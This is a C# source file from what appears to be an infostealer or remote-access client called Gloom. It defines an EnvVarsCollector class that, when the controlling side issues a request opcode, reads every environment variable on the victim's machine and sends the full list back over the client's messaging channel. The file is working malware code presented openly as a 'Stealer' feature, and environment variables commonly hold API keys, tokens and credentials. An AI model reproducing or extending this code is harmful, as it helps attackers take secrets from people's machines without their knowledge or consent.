using System.Collections;
using System.Collections.Immutable;

namespace Gloom.Client.Features.Stealer.InfoCollector;
internal class EnvVarsCollector : FeatureBase
{
	public override Guid[] AcceptedOps => new Guid[] { OpCodes.EnvVarsRequest };

	public EnvVarsCollector(IMessageSender sender) : base(sender)
	{
	}

	private List<(string, string)> BuildEnvVarsList()
	{
		var dict = new List<(string, string)>();
		foreach (DictionaryEntry entry in Environment.GetEnvironmentVariables())
			dict.Add(((string)entry.Key, (string)(entry.Value ?? "<null>")));
		return dict.ToList();
	}

	public override async Task HandleAsync(Guid op, byte[] data)
	{
		var evlist = new OpStructs.EnvVarsResponse
		{
			Map = BuildEnvVarsList()
		};
		await SendAsync(OpCodes.EnvVarsResponse, evlist, true);
	}
}
